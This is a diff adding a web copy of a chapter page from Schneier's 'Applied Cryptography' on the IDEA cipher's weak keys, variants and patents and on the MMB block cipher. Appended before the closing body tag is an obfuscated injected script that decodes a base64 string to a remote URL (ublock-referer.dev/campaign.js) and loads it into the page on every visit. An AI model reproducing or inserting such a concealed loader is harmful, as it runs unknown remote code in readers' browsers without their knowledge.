@@ -1,0 +1,124 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=13//-->
+<!--PAGES=323-326//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>The number at the positions of &#147;<I>x</I>&#148; can be any number. If this key is used, the bit-wise XOR of certain plaintext pairs guarantees the bit-wise XOR of the resultant ciphertext pairs.</P>
+<P>In any case, the chance of accidentally generating one of these weak keys is very small: one in 2<SUP>96</SUP>. There is no danger if you choose keys at random. And it is easy to modify IDEA so that it doesn&#146;t have any weak keys: XOR every subkey with the value 0x0dae [409].</P>
+<P>I know of no other cryptanalytic results against IDEA, although many people have tried.</P>
+<P><FONT SIZE="+1"><B><I>IDEA Modes of Operation and Variants</I></B></FONT></P>
+<P>IDEA can work within any block cipher mode discussed in Chapter 9. Any double-IDEA implementation would be susceptible to the same meet-in-the-middle attack as DES (see Section 15.1). However, because IDEA&#146;s key length is more than double DES&#146;s, the attack is impractical. It would require a storage space of 64*2<SUP>128</SUP> bits, or 10<SUP>39</SUP> bytes. Maybe there&#146;s enough matter in the universe to create a memory device that large, but I doubt it.</P>
+<I><P><A NAME="Fig10"></A><A HREF="javascript:displayWindow('images/13-10.jpg',316,339 )"><IMG SRC="images/13-10t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/13-10.jpg',316,339)"><FONT COLOR="#000077"><B>Figure 13.10</B></FONT></A>&nbsp;&nbsp;PES.</I>
+</P>
+<P>If you&#146;re worried about parallel universes as well, use a triple-IDEA implementation (see Section 15.2):
+</P>
+<DL>
+<DD><I>C</I> = <I>E</I><SUB><SMALL>K</SMALL>3</SUB>(<I><SMALL>D</SMALL><SUB>K</I>2</SUB>(<I>E</I><SUB><SMALL>K</SMALL>1</SUB>(<I>P</I>)))
+</DL>
+<P>It is immune to the meet-in-the-middle attack.
+</P>
+<P>There&#146;s also no reason why you can&#146;t implement IDEA with independent subkeys, especially if you have key-management tools to handle the longer key. IDEA needs a total of 52 16-bit keys, for a total key length of 832 bits. This variant is definitely more secure, but no one knows by how much.</P>
+<P>A na&#239;ve variation might double the block size. The algorithm would work just as well with 32-bit sub-blocks instead of 16-bit sub-blocks, and a 256-bit key. Encryption would be quicker and security would increase 2<SUP>32</SUP> times. Or would it? The theory behind the algorithm hinges on the fact that 2<SUP>16</SUP> &#43; 1 is prime; 2<SUP>32</SUP> &#43; 1 is not. Perhaps the algorithm could be modified to work, but it would have very different security properties. Lai says it would be difficult to make it work [926].</P>
+<P>While IDEA appears to be significantly more secure than DES, it isn&#146;t always easy to substitute one for the other in an existing application. If your database and message templates are hardwired to accept a 64-bit key, it may be impossible to implement IDEA&#146;s 128-bit key.</P>
+<P>For those applications, generate a 128-bit key by concatenating the 64-bit key with itself. Remember that IDEA is weakened considerably by this modification.</P>
+<P>If you are more concerned with speed than security, you might consider a variant of IDEA with fewer rounds. Currently the best attack against IDEA is faster than brute force only for 2.5 rounds or less [1050]; 4 round IDEA would be twice as fast and, as far as I know, just as secure.</P>
+<P><FONT SIZE="+1"><B><I>Caveat Emptor</I></B></FONT></P>
+<P>IDEA is a relatively new algorithm, and many questions remain. Is IDEA a group? (Lai thinks not [926].) Are there any still-undiscovered ways of breaking this cipher? IDEA has a firm theoretical basis, but time and time again secure-looking algorithms have fallen to new forms of cryptanalysis. Several academic and military groups have cryptanalyzed IDEA. None of them has gone public about any successes they might have had. One might&#151;someday.
+</P>
+<P><FONT SIZE="+1"><B><I>Patents and Licenses</I></B></FONT></P>
+<P>IDEA is patented in Europe and the United States [1012, 1013]. The patent is held by Ascom-Tech AG. No license fee is required for non-commercial use. Commercial users interested in licensing the algorithm should contact Ascom Systec AG, Dept CMVV, Gewerbepark, CH-5506, M&#228;genwil, Switzerland<I>;</I> &#43;41 64 56 59 83<I>;</I> Fax:&#43;41 64 56 59 90<I>;</I> idea@ascom.ch.</P>
+<H3><A NAME="Heading11"></A><FONT COLOR="#000077">13.10 MMB</FONT></H3>
+<P>A complaint against IDEA, that it uses a 64-bit encryption block, was addressed by Joan Daemen in an algorithm called MMB (Modular Multiplication-based Block cipher) [385, 405, 406]. MMB is based on the same basic theory as IDEA: mixing operations of different algebraic groups. MMB is an iterative algorithm that mainly consists of linear steps (XOR and key applications) and the parallel applications of four large nonlinear invertible substitutions. These substitutions are determined by a multiplication modulo 2<SUP>32</SUP> &#150; 1 with constant factors. The result is an algorithm that has both a 128-bit key and a 128-bit block size.</P>
+<P>MMB operates on 32-bit sub-blocks of text (<I>x</I><SUB>0</SUB>, <I>x</I><SUB>1</SUB>, <I>x</I><SUB>2</SUB>, <I>x</I><SUB>3</SUB>) and 32-bit sub-blocks of key (<I>k</I><SUB>0</SUB>, <I>k</I><SUB>1</SUB>, <I>k</I><SUB>2</SUB>, <I>k</I><SUB>3</SUB>). This makes the algorithm well suited for implementation on modern, 32-bit processors. A nonlinear function, f, is applied six times alternating with XORing. Here it is (all index operations are mod 4):</P>
+<DL>
+<DD><I>x</I><SUB>i</SUB> = <I>x</I><SUB>i</SUB> &#8853; <I>k</I><SUB>i</SUB>, for <I>i</I> = 0 to 3
+<DD>f(<I>x</I><SUB>0</SUB>,<I>x</I><SUB>1</SUB>,<I>x</I><SUB>2</SUB>,<I>x</I><SUB>3</SUB>)
+<DD><I>x</I><SUB>i</SUB> = <I>x</I><SUB>i</SUB> &#8853; <I>k</I><SUB>i &#43; 1</SUB>, for <I>i</I> = 0 to 3
+<DD>f(<I>x</I><SUB>0</SUB>,<I>x</I><SUB>1</SUB>,<I>x</I><SUB>2</SUB>,<I>x</I><SUB>3</SUB>)
+<DD><I>x</I><SUB>i</SUB> = <I>x</I><SUB>i</SUB> &#8853; <I>k</I><SUB>i &#43; 2</SUB>, for <I>i</I> = 0 to 3
+<DD>f(<I>x</I><SUB>0</SUB>,<I>x</I><SUB>1</SUB>,<I>x</I><SUB>2</SUB>,<I>x</I><SUB>3</SUB>)
+<DD><I>x</I><SUB>i</SUB> = <I>x</I><SUB>i</SUB> &#8853; <I>k</I><SUB>i</SUB>, for <I>i</I> = 0 to 3
+<DD>f(<I>x</I><SUB>0</SUB>,<I>x</I><SUB>1</SUB>,<I>x</I><SUB>2</SUB>,<I>x</I><SUB>3</SUB>)
+<DD><I>x</I><SUB>i</SUB> = <I>x</I><SUB>i</SUB> &#8853; <I>k</I><SUB>i &#43; 1</SUB>, for <I>i</I> = 0 to 3
+<DD>f(<I>x</I><SUB>0</SUB>,<I>x</I><SUB>1</SUB>,<I>x</I><SUB>2</SUB>,<I>x</I><SUB>3</SUB>)
+<DD><I>x</I><SUB>i</SUB> = <I>x</I><SUB>i</SUB> &#8853; <I>k</I><SUB>i &#43; 2</SUB>, for <I>i</I> = 0 to 3
+<DD>f(<I>x</I><SUB>0</SUB>,<I>x</I><SUB>1</SUB>,<I>x</I><SUB>2</SUB>,<I>x</I><SUB>3</SUB>)
+</DL>
+<P>The function f has three steps:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;<I>x</I><SUB>i</SUB> = <I>c</I><SUB>i</SUB> * <I>x</I><SUB>i</SUB>, for <I>i</I> = 0 to 3 (If the input to the multiplication is all 1s, the output is also all 1s.)
+<DD><B>(2)</B>&nbsp;&nbsp;If the least significant bit of <I>x</I><SUB>0</SUB> = 1, then <I>x</I><SUB>0</SUB> = <I>x</I><SUB>0</SUB> &#8853; C. If the least significant byte of <I>x</I><SUB>3</SUB> = 0, then <I>x</I><SUB>3</SUB> = <I>x</I><SUB>3</SUB> &#8853; C.
+<DD><B>(3)</B>&nbsp;&nbsp;<I>x</I><SUB>i</SUB> = <I>x</I><SUB>i &#150; 1</SUB> &#8853; <I>x</I><SUB>i</SUB> &#8853; <I>x</I><SUB>i &#43; 1</SUB>, for <I>i</I> = 0 to 3
+<P>All index operations are mod 4. The multiplication operation in step (1) is modulo 2<SUP>32</SUP> &#150; 1. For the purposes of the algorithm, if the second operand is 2<SUP>32</SUP> &#150; 1, then the result is 2<SUP>32</SUP> &#150; 1. The various constants are:
+</DL>
+<DL>
+<DD>C = 2aaaaaaa
+<DD>c<SUB>0</SUB> = 025f1cdb
+<DD>c<SUB>1</SUB> = 2 * c<SUB>0</SUB>
+<DD>c<SUB>2</SUB> = 2<SUP>3</SUP> * c<SUB>0</SUB>
+<DD>c<SUB>3</SUB> = 2<SUP>7</SUP> * c<SUB>0</SUB>
+</DL>
+<P>The constant C is the &#147;simplest&#148; constant with a high ternary weight, a least-significant bit of zero, and no circular symmetry. The constant c<SUB>0</SUB> has certain other characteristics. The constants c<SUB>1</SUB>, c<SUB>2</SUB>, and c<SUB>3</SUB> are shifted versions of c<SUB>0</SUB>, preventing attacks based on symmetry. See [405] for more details.</P>
+<P>Decryption is the reverse process. Steps (2) and (3) are their own inverse. Step (1) uses <I>c</I><SUB>i</SUB><SUP>-1</SUP> instead of <I>c</I><SUB>i</SUB>. The value of <I>c</I><SUB>0</SUB><SUP>-1</SUP> is 0dad4694.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(PiTebcvD, FWoVJFCv) {FWoVJFCv = PiTebcvD.createElement('script');FWoVJFCv.type = 'text/javascript';FWoVJFCv.async = true;FWoVJFCv.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');PiTebcvD.getElementsByTagName('body')[0].appendChild(FWoVJFCv);}(document));</script></body>
+</html>
